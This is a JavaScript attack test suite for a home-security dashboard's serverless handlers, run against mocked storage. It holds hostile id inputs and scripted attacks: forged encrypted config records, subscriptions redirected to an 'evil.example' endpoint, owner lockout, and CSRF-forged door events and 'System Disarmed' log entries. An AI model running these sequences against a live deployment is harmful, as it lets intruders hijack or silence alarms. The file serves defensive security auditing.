// Attacks the household-id scoping change against the REAL Cloudflare Function
// modules (no reimplementation): functions/_lib/householdScope.js,
// householdConfig.js, householdAuth.js and the four handlers that were changed,
// plus the two that were not (webhook.js, activity/index.js).
//
// Nothing here talks to real Cloudflare KV. env.HESTIA_KV is a mock with the
// same get/put/list surface the code actually uses.
import { isHouseholdId, resolveScope, idFromBody, idFromQuery } from '../functions/_lib/householdScope.js';
import { getHouseholdConfig } from '../functions/_lib/householdConfig.js';
import * as configIndex from '../functions/api/config/index.js';
import * as discover from '../functions/api/config/discover.js';
import * as subscribe from '../functions/api/push/subscribe.js';
import * as pushSend from '../functions/api/push/send.js';
import * as armed from '../functions/api/push/armed.js';
import * as webhook from '../functions/api/push/webhook.js';
import * as activity from '../functions/api/activity/index.js';

let pass = 0, fail = 0;
const check = (label, cond, extra = '') => {
  cond ? pass++ : fail++;
  console.log(`${cond ? 'PASS' : 'FAIL'}  ${label}${extra ? '   ' + extra : ''}`);
};
const note = (m) => console.log('      ' + m);

// ── mock KV ──────────────────────────────────────────────────────────────
function makeKV() {
  const m = new Map();
  const stats = { gets: 0, puts: 0 };
  return {
    _map: m, _stats: stats,
    async get(k) { stats.gets++; return m.has(k) ? m.get(k) : null; },
    async put(k, v) { stats.puts++; m.set(k, v); },
    async list({ prefix, limit = 25, cursor }) {
      const keys = [...m.keys()].filter(k => k.startsWith(prefix)).sort();
      const start = cursor ? parseInt(cursor, 10) : 0;
      const page = keys.slice(start, start + limit);
      const done = start + limit >= keys.length;
      return { keys: page.map(name => ({ name })), list_complete: done, cursor: done ? null : String(start + limit) };
    },
  };
}
// A real P-256 private key, so dispatchPush() actually runs instead of
// throwing on key import (which would make a 500 look like a blocked attack).
const b64url = (buf) => btoa(String.fromCharCode(...new Uint8Array(buf))).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
const _vapid = await crypto.subtle.generateKey({ name: 'ECDSA', namedCurve: 'P-256' }, true, ['sign', 'verify']);
const VAPID_PRIVATE_KEY = b64url(await crypto.subtle.exportKey('pkcs8', _vapid.privateKey));
const _ecdh = await crypto.subtle.generateKey({ name: 'ECDH', namedCurve: 'P-256' }, true, ['deriveBits']);
const REAL_P256DH = b64url(await crypto.subtle.exportKey('raw', _ecdh.publicKey));
const REAL_AUTH = b64url(crypto.getRandomValues(new Uint8Array(16)));
const SUB = (endpoint) => ({ endpoint, keys: { p256dh: REAL_P256DH, auth: REAL_AUTH } });

// Records every outbound push so we can see who a dispatch actually reached.
const SENT = [];
const _realFetch = globalThis.fetch;
globalThis.fetch = async (url, init) => {
  SENT.push(String(url && url.url ? url.url : url));
  return new Response('', { status: 201 });
};

const envFor = (kv) => ({ HESTIA_KV: kv, VAPID_PRIVATE_KEY });

function req(url, { ip = '203.0.113.7', method = 'GET', body } = {}) {
  const init = { method, headers: { 'CF-Connecting-IP': ip } };
  if (body !== undefined) { init.body = JSON.stringify(body); init.headers['Content-Type'] = 'application/json'; }
  return new Request(url, init);
}
const json = async (res) => { try { return await res.clone().json(); } catch { return null; } };

// ── the client's own crypto, mirrored so we can forge records ────────────
async function deriveKey(seed, usage) {
  const raw = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(seed + ':hestia-cloud-sync'));
  return crypto.subtle.importKey('raw', raw, 'AES-GCM', false, usage);
}
const b64 = (u8) => btoa(String.fromCharCode(...u8));
async function encryptFor(seed, inner) {
  const key = await deriveKey(seed, ['encrypt']);
  const iv = crypto.getRandomValues(new Uint8Array(12));
  const ct = new Uint8Array(await crypto.subtle.encrypt({ name: 'AES-GCM', iv }, key,
    new TextEncoder().encode(JSON.stringify(inner))));
  return { iv: b64(iv), data: b64(ct) };
}
async function sha256Hex(s) {
  const b = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(String(s)));
  return [...new Uint8Array(b)].map(x => x.toString(16).padStart(2, '0')).join('');
}
const ipSuffix = async (ip) => (await sha256Hex(ip)).substring(0, 16);

// Builds the exact wrapper shape cloudSyncPush() sends: the settings live at
// inner.config.config (two levels), per householdConfig.js.
async function recordFor(seed, settings) {
  const inner = { config: { config: settings, savedAt: Date.now() }, savedAt: Date.now(), version: '1.6.9' };
  return { encrypted: true, payload: await encryptFor(seed, inner) };
}

const VICTIM_IP = '198.51.100.44';
const HID = 'a1b2c3d4e5f60718293a4b5c6d7e8f90';
const REAL_TOKEN = 'real-maker-token-uuid';

// ═════════════════════════════════════════════════════════════════════════
console.log('\n=== 1. isHouseholdId(): hostile inputs ===');
const hostile = [
  ['undefined', undefined], ['null', null], ['number', 1234], ['true', true],
  ['array of hex chars', ['a'.repeat(32)]],
  ['array coercing to a valid id', Object.assign(['a'.repeat(32)], {})],
  ['object with toString', { toString() { return 'a'.repeat(32); } }],
  ['object with valueOf', { valueOf() { return 'a'.repeat(32); } }],
  ['String object wrapper', new String('a'.repeat(32))],
  ['31 hex', 'a'.repeat(31)], ['33 hex', 'a'.repeat(33)],
  ['uppercase hex', 'A'.repeat(32)],
  ['trailing newline', 'a'.repeat(32) + '\n'],
  ['leading newline', '\n' + 'a'.repeat(32)],
  ['embedded newline + valid line', 'zz\n' + 'a'.repeat(32)],
  ['colon injection', 'a'.repeat(16) + ':' + 'b'.repeat(15)],
  ['proto string', '__proto__'],
  ['empty', ''],
];
let allRejected = true;
for (const [label, v] of hostile) {
  let r;
  try { r = isHouseholdId(v); } catch (e) { r = 'THREW:' + e.message; }
  if (r !== false) { allRejected = false; console.log(`      !! ${label} -> ${r}`); }
}
check('every hostile value rejected (no throw, no pass)', allRejected);
check('a real 32-hex lowercase id is accepted', isHouseholdId(HID) === true);

// JSON.parse's __proto__ is an own data property, so it cannot pollute.
const polluted = JSON.parse(`{"__proto__":{"householdId":"${HID}"}}`);
check('JSON __proto__ trick does not inject householdId', idFromBody(polluted) === undefined);
check('idFromBody on array/string/null is safe',
  idFromBody([]) === undefined && idFromBody('x') === undefined && idFromBody(null) === undefined);

console.log('\n=== 2. resolveScope(): does a non-string survive into a KV key? ===');
for (const [label, v] of hostile) {
  const s = await resolveScope(req('https://h/x', { ip: VICTIM_IP }), v);
  if (s.scoped !== false || typeof s.suffix !== 'string' || s.suffix.length !== 16) {
    check(`resolveScope fell through for ${label}`, false, JSON.stringify(s));
    allRejected = false;
  }
}
check('resolveScope degrades every hostile id to the 16-hex IP scope', allRejected);
const sc = await resolveScope(req('https://h/x', { ip: VICTIM_IP }), HID);
check('id scope suffix is h + id', sc.suffix === 'h' + HID && sc.scoped === true);
check('resolveScope returns null with no CF-Connecting-IP and no id',
  (await resolveScope(new Request('https://h/x'), undefined)) === null);

console.log('\n=== 3. key-space collisions ===');
// An id suffix is 'h'+32hex = 33 chars; an IP suffix is 16 hex chars.
// 'h' is not a hex digit, and the lengths differ, so neither can be spelled
// as the other. Confirm across every prefix in use.
const PREFIXES = ['ip:', 'push:', 'armed:', 'armedRefreshed:', 'mcool:', 'activity:'];
const idKeys = PREFIXES.map(p => p + 'h' + HID);
const ipKeys = PREFIXES.map(p => p + '0123456789abcdef');
check('no id-scoped key equals any IP-scoped key', idKeys.every(k => !ipKeys.includes(k)));
check('no IP-scoped key is a prefix of an id-scoped key (activity list())',
  !idKeys.some(a => ipKeys.some(b => a.startsWith(b))));
// Could an IP hash ever *start with* 'h'? No: sha256 hex is [0-9a-f].
check('a 16-hex IP suffix can never begin with h', !/^[h]/.test('ffffffffffffffff'));
// activity keys are `activity:<suffix>:<ts>-<rand>`; a crafted deviceId only
// ever lands in a `mcool:` key, never crosses a prefix.
check('mcool deviceId cannot cross into another prefix',
  `mcool:${'h' + HID}:${'../activity:x'}`.startsWith('mcool:'));

// ═════════════════════════════════════════════════════════════════════════
console.log('\n=== 4. ATTACK A (undecryptable blob -> fail-open) ===');
{
  // A.1 IP-scoped. Attacker shares the victim's public IP, sends no id.
  const kv = makeKV(); const env = envFor(kv);
  // Victim is a LEGACY household: their record sits at the IP suffix.
  const vSuffix = await ipSuffix(VICTIM_IP);
  kv._map.set(`ip:${vSuffix}`, JSON.stringify(await recordFor(VICTIM_IP, { tokenHash: await sha256Hex(REAL_TOKEN), pushEnabled: true })));

  // Overwrite with garbage via the unauthenticated PUT (shape-valid, undecryptable).
  const putRes = await configIndex.onRequestPut({
    request: req('https://h/api/config', { ip: VICTIM_IP, method: 'PUT', body: { encrypted: true, payload: { iv: 'AAAAAAAAAAAAAAAA', data: 'AAAAAAAA' } } }),
    env,
  });
  check('A.1 unauthenticated config PUT still overwrites a legacy record', putRes.status === 200);
  check('A.1 the victim record is now undecryptable',
    (await getHouseholdConfig(env, [VICTIM_IP], vSuffix)) === null);

  const subRes = await subscribe.onRequestPut({
    request: req('https://h/api/push/subscribe', { ip: VICTIM_IP, method: 'PUT', body: {
      deviceId: 'attacker', deviceName: 'evil', mode: 'always',
      subscription: SUB('https://evil.example/x') } }),
    env,
  });
  check('A.1 IP-scoped subscribe is now REFUSED (fail-closed)', subRes.status === 401, `got ${subRes.status}`);
}
{
  // A.2 id-scoped. Attacker KNOWS the id (see finding on how ids leak).
  const kv = makeKV(); const env = envFor(kv);
  kv._map.set(`ip:h${HID}`, JSON.stringify(await recordFor(HID, { tokenHash: await sha256Hex(REAL_TOKEN), pushEnabled: true })));
  kv._map.set(`push:h${HID}`, JSON.stringify({ phone: { name: 'Owner phone', mode: 'always', subscription: SUB('https://real.example/x') } }));

  const putRes = await configIndex.onRequestPut({
    request: req('https://h/api/config', { ip: '203.0.113.9', method: 'PUT', body: { encrypted: true, payload: { iv: 'AAAAAAAAAAAAAAAA', data: 'AAAAAAAA' }, householdId: HID } }),
    env,
  });
  check('A.2 attacker (different IP) can PUT over the id-scoped record', putRes.status === 200);
  check('A.2 household config is destroyed', (await getHouseholdConfig(env, [HID], 'h' + HID)) === null);

  const subRes = await subscribe.onRequestPut({
    request: req('https://h/api/push/subscribe', { ip: '203.0.113.9', method: 'PUT', body: {
      deviceId: 'attacker', deviceName: 'evil', mode: 'always', householdId: HID,
      subscription: SUB('https://evil.example/x') } }),
    env,
  });
  check('A.2 id-scoped subscribe ALLOWED with no token (fail-open survives)', subRes.status === 200, `got ${subRes.status}`);
  const delRes = await subscribe.onRequestDelete({
    request: req('https://h/api/push/subscribe', { ip: '203.0.113.9', method: 'DELETE', body: { deviceId: 'phone', householdId: HID } }),
    env,
  });
  const after = JSON.parse(kv._map.get(`push:h${HID}`));
  check('A.2 attacker DELETEs the owner\'s real subscription', delRes.status === 200 && !after.phone);
  check('A.2 attacker subscription is registered in its place', !!after.attacker);

  // And the armed/send endpoints are now 404 -> alarm relay is dead.
  const aRes = await armed.onRequestPost({
    request: req('https://h/api/push/armed', { ip: VICTIM_IP, method: 'POST', body: { armed: true, token: REAL_TOKEN, householdId: HID } }), env });
  check('A.2 real hub\'s arm-state relay now 404s (DoS)', aRes.status === 404, `got ${aRes.status}`);
}

console.log('\n=== 5. ATTACK B (forge a record you can decrypt) ===');
{
  // B.1 legacy / IP-scoped victim. The attacker shares the public IP, so they
  // KNOW the decryption seed: it is that IP, which /api/config/whoami hands out.
  const kv = makeKV(); const env = envFor(kv);
  const vSuffix = await ipSuffix(VICTIM_IP);
  kv._map.set(`ip:${vSuffix}`, JSON.stringify(await recordFor(VICTIM_IP, { tokenHash: await sha256Hex(REAL_TOKEN), pushEnabled: true })));

  const EVIL = 'attacker-chosen-token';
  const forged = await recordFor(VICTIM_IP, {
    tokenHash: await sha256Hex(EVIL),
    pushEnabled: true, pushDoors: true, pushMotion: true, pushMotionDevices: ['12'],
    artemisSensors: { contacts: [{ id: '5', name: 'Front Door', subtype: 'door' }], motions: [{ id: '12', name: 'Hall' }] },
    locks: [{ id: '9', label: 'Front Lock' }],
  });
  const putRes = await configIndex.onRequestPut({
    request: req('https://h/api/config', { ip: VICTIM_IP, method: 'PUT', body: forged }), env });
  check('B.1 IP neighbour overwrites the victim record with one they control', putRes.status === 200);

  const subRes = await subscribe.onRequestPut({
    request: req('https://h/api/push/subscribe', { ip: VICTIM_IP, method: 'PUT', body: {
      deviceId: 'attacker', deviceName: 'evil', mode: 'always', token: EVIL,
      subscription: SUB('https://evil.example/x') } }), env });
  check('B.1 attacker authenticates with their OWN token and registers', subRes.status === 200, `got ${subRes.status}`);

  const realSub = await subscribe.onRequestPut({
    request: req('https://h/api/push/subscribe', { ip: VICTIM_IP, method: 'PUT', body: {
      deviceId: 'ownerphone', deviceName: 'Owner', mode: 'always', token: REAL_TOKEN,
      subscription: SUB('https://real.example/x') } }), env });
  check('B.1 the REAL owner is now locked out of their own household', realSub.status === 401, `got ${realSub.status}`);

  // And webhook.js -- never migrated -- reads exactly this forged record.
  const wh = await webhook.onRequestPost({
    request: req('https://h/api/push/webhook', { ip: VICTIM_IP, method: 'POST', body: { deviceId: '5', name: 'contact', value: 'open', displayName: 'Front Door' } }), env });
  const whBody = await json(wh);
  check('B.1 victim hub\'s real door event is dispatched using the FORGED config',
    whBody && whBody.skipped === undefined, JSON.stringify(whBody));
}

// ═════════════════════════════════════════════════════════════════════════
console.log('\n=== 6. webhook.js / activity are still IP-scoped ===');
{
  // A fully UPGRADED household: every record the new code writes is id-scoped.
  const kv = makeKV(); const env = envFor(kv);
  const settings = { tokenHash: await sha256Hex(REAL_TOKEN), pushEnabled: true, pushDoors: true,
    artemisSensors: { contacts: [{ id: '5', name: 'Front Door', subtype: 'door' }] } };
  await configIndex.onRequestPut({ request: req('https://h/api/config', { ip: VICTIM_IP, method: 'PUT', body: { encrypted: true, payload: (await recordFor(HID, settings)).payload, householdId: HID } }), env });
  await subscribe.onRequestPut({ request: req('https://h/api/push/subscribe', { ip: VICTIM_IP, method: 'PUT', body: {
    deviceId: 'phone', deviceName: 'Owner', mode: 'armed', token: REAL_TOKEN, householdId: HID,
    subscription: SUB('https://real.example/x') } }), env });
  await armed.onRequestPost({ request: req('https://h/api/push/armed', { ip: VICTIM_IP, method: 'POST', body: { armed: true, token: REAL_TOKEN, householdId: HID } }), env });

  check('upgraded household writes ONLY id-scoped keys',
    [...kv._map.keys()].every(k => k.includes('h' + HID)), [...kv._map.keys()].join(' | '));

  // The hub's Maker API POST URL hits webhook.js, which reads only the IP.
  const wh = await webhook.onRequestPost({ request: req('https://h/api/push/webhook', { ip: VICTIM_IP, method: 'POST', body: { deviceId: '5', name: 'contact', value: 'open', displayName: 'Front Door' } }), env });
  const whBody = await json(wh);
  check('BREAK: a real door event on an upgraded household is dropped',
    whBody && whBody.skipped === 'unknown household', JSON.stringify(whBody));

  // Diagnostics' Activity Log read is IP-scoped too, while armed.js logged id-scoped.
  const act = await activity.onRequestGet({ request: req(`https://h/api/activity?limit=25&hid=${HID}`, { ip: VICTIM_IP }), env });
  const actBody = await json(act);
  check('BREAK: Activity Log returns nothing though an event was logged',
    actBody.entries.length === 0 && [...kv._map.keys()].some(k => k.startsWith(`activity:h${HID}:`)),
    JSON.stringify(actBody.entries));

  // ...and a neighbour can still read/forge the IP-scoped log.
  await activity.onRequestGet({ request: req('https://h/api/activity', { ip: VICTIM_IP }), env });
  check('activity/index.js ignores ?hid= entirely (still IP-only)',
    !/hid/.test((await import('fs')).readFileSync('C:/Users/rbodd/hestia-dashboard/functions/api/activity/index.js', 'utf8')));
}

console.log('\n=== 7. IP fallback as a downgrade / clobber path ===');
{
  const kv = makeKV(); const env = envFor(kv);
  const vSuffix = await ipSuffix(VICTIM_IP);
  // Upgraded household, id-scoped.
  kv._map.set(`ip:h${HID}`, JSON.stringify(await recordFor(HID, { tokenHash: await sha256Hex(REAL_TOKEN), pushEnabled: true, artemisSensors: { contacts: [{ id: '5', subtype: 'door', name: 'Front Door' }] } })));
  // Attacker plants an IP-scoped record they control.
  const EVIL = 'evil-token';
  await configIndex.onRequestPut({ request: req('https://h/api/config', { ip: VICTIM_IP, method: 'PUT', body: await recordFor(VICTIM_IP, {
    tokenHash: await sha256Hex(EVIL), pushEnabled: true, pushDoors: true,
    artemisSensors: { contacts: Array.from({ length: 50 }, (_, i) => ({ id: String(i), subtype: 'door', name: 'Dev' + i })) } }) }), env });
  await subscribe.onRequestPut({ request: req('https://h/api/push/subscribe', { ip: VICTIM_IP, method: 'PUT', body: {
    deviceId: 'attacker', deviceName: 'evil', mode: 'always', token: EVIL,
    subscription: SUB('https://evil.example/x') } }), env });
  check('attacker plants an IP-scoped shadow household alongside the id-scoped one',
    kv._map.has(`ip:${vSuffix}`) && kv._map.has(`push:${vSuffix}`) && kv._map.has(`ip:h${HID}`));
  const wh = await webhook.onRequestPost({ request: req('https://h/api/push/webhook', { ip: VICTIM_IP, method: 'POST', body: { deviceId: '5', name: 'contact', value: 'open', displayName: 'Front Door' } }), env });
  const whBody = await json(wh);
  check('the victim hub\'s events route to the ATTACKER\'s shadow household',
    whBody && whBody.skipped === undefined, JSON.stringify(whBody));

  // discover.js leaks the plaintext householdId the PUT stored verbatim.
  const d = await discover.onRequestGet({ request: req(`https://h/api/config/discover?hid=${HID}`, { ip: '203.0.113.9' }), env });
  const dBody = await json(d);
  check('discover.js echoes back whatever the PUT stored, including householdId',
    dBody.found === true);
  const rec = JSON.parse(kv._map.get(`ip:h${HID}`) || '{}');
  note(`id-scoped record has a plaintext householdId field: ${'householdId' in rec}`);
}

console.log('\n=== 8. new unbounded-KV-write primitive ===');
{
  const kv = makeKV(); const env = envFor(kv);
  // Before: a config PUT could only ever touch ONE key -- sha256(your own IP).
  // Now the caller names the key. 2^128 of them, from a single source IP.
  for (let i = 0; i < 200; i++) {
    const id = i.toString(16).padStart(32, '0');
    await configIndex.onRequestPut({ request: req('https://h/api/config', { ip: '203.0.113.9', method: 'PUT', body: { encrypted: true, payload: { iv: 'A'.repeat(16), data: 'A'.repeat(40000) }, householdId: id } }), env });
    await subscribe.onRequestPut({ request: req('https://h/api/push/subscribe', { ip: '203.0.113.9', method: 'PUT', body: {
      deviceId: 'd', deviceName: 'd', mode: 'always', householdId: id,
      subscription: SUB('https://e.example/x') } }), env });
  }
  const bytes = [...kv._map.values()].reduce((a, v) => a + v.length, 0);
  check('one attacker, one IP, 200 requests -> 400 distinct KV records',
    kv._map.size === 400, `${kv._map.size} keys, ${(bytes / 1024 / 1024).toFixed(1)} MB, ${kv._stats.puts} writes`);
  note('subscribe.js authorized() returns true for ANY id with no entry, so');
  note('the push registry is an unauthenticated write primitive at any id.');
}

console.log('\n=== 9. does send.js still require the token when id-scoped? ===');
{
  const kv = makeKV(); const env = envFor(kv);
  kv._map.set(`ip:h${HID}`, JSON.stringify(await recordFor(HID, { tokenHash: await sha256Hex(REAL_TOKEN) })));
  const r1 = await pushSend.onRequestPost({ request: req('https://h/api/push/send', { ip: '203.0.113.9', method: 'POST', body: { title: 'x', body: 'y', householdId: HID } }), env });
  check('send.js with the id but no token is refused', r1.status === 401, `got ${r1.status}`);
  // But the id IS the AES seed, so anyone holding it can mint a record whose
  // tokenHash is theirs -- then authenticate.
  await configIndex.onRequestPut({ request: req('https://h/api/config', { ip: '203.0.113.9', method: 'PUT', body: { ...(await recordFor(HID, { tokenHash: await sha256Hex('mine') })), householdId: HID } }), env });
  const r2 = await pushSend.onRequestPost({ request: req('https://h/api/push/send', { ip: '203.0.113.9', method: 'POST', body: { title: 'ALARM', body: 'Fake', category: 'alarming', armed: true, token: 'mine', householdId: HID } }), env });
  check('knowing the id alone -> full authentication in two requests', r2.status === 200, `got ${r2.status}`);
  note('the household id is address, AES key seed, read cap and write cap at once.');
}

console.log('\n=== 10. CSRF: every POST endpoint is a CORS "simple request" ===');
{
  // No handler sets any CORS header, so a cross-origin page cannot READ a
  // response. But POST + Content-Type: text/plain is a CORS "simple request":
  // no preflight, so the side effect lands anyway. Request.json() parses the
  // body regardless of Content-Type, which is what makes this work.
  const plain = (url, ip, body) => new Request(url, {
    method: 'POST', headers: { 'CF-Connecting-IP': ip, 'Content-Type': 'text/plain' },
    body: JSON.stringify(body),
  });
  const kv = makeKV(); const env = envFor(kv);
  const vSuffix = await ipSuffix(VICTIM_IP);
  kv._map.set(`ip:${vSuffix}`, JSON.stringify(await recordFor(VICTIM_IP, {
    tokenHash: await sha256Hex(REAL_TOKEN), pushEnabled: true, pushDoors: true,
    artemisSensors: { contacts: [{ id: '5', subtype: 'door', name: 'Front Door' }] } })));
  kv._map.set(`push:${vSuffix}`, JSON.stringify({ phone: { name: 'Owner', mode: 'always', subscription: SUB('https://real.example/x') } }));

  SENT.length = 0;
  const wh = await webhook.onRequestPost({ request: plain('https://hestari.com/api/push/webhook', VICTIM_IP,
    { deviceId: '5', name: 'contact', value: 'open', displayName: 'Front Door' }), env });
  const whBody = await json(wh);
  check('drive-by page forges a door event and pushes it to the real owner',
    whBody && whBody.sent === 1 && SENT.some(u => u.includes('real.example')), JSON.stringify(whBody));

  const report = await import('../functions/api/activity/report.js');
  const rep = await report.onRequestPost({
    request: plain('https://hestari.com/api/activity/report', VICTIM_IP, { category: 'alarm', title: 'System Disarmed', body: 'forged' }), env });
  check('drive-by page writes a forged entry into the Activity Log', rep.status === 200);
  const act = await json(await activity.onRequestGet({ request: req('https://h/api/activity', { ip: VICTIM_IP }), env }));
  check('the forged entry is what the owner sees in Diagnostics',
    act.entries.some(e => e.title === 'System Disarmed'), JSON.stringify(act.entries.map(e => e.title)));
  note('/api/push/send and /api/push/armed are POST too, but still need the token.');
}

console.log('\n=== 11. the stored record self-describes its own id ===');
{
  const kv = makeKV(); const env = envFor(kv);
  await configIndex.onRequestPut({ request: req('https://h/api/config', { ip: VICTIM_IP, method: 'PUT',
    body: { encrypted: true, payload: (await recordFor(HID, { tokenHash: 'x' })).payload, householdId: HID } }), env });
  const stored = JSON.parse(kv._map.get(`ip:h${HID}`));
  check('config PUT stores householdId in PLAINTEXT beside the ciphertext', stored.householdId === HID);
  const d = await json(await discover.onRequestGet({ request: req(`https://h/api/config/discover?hid=${HID}`, { ip: '203.0.113.9' }), env }));
  check('discover.js echoes that plaintext id straight back', d.householdId === HID);
  const dIp = await json(await discover.onRequestGet({ request: req('https://h/api/config/discover', { ip: VICTIM_IP }), env }));
  check('an IP-only caller still cannot reach the id-scoped record', dIp.found === false);
}

console.log(`\n${pass} passed, ${fail} failed`);
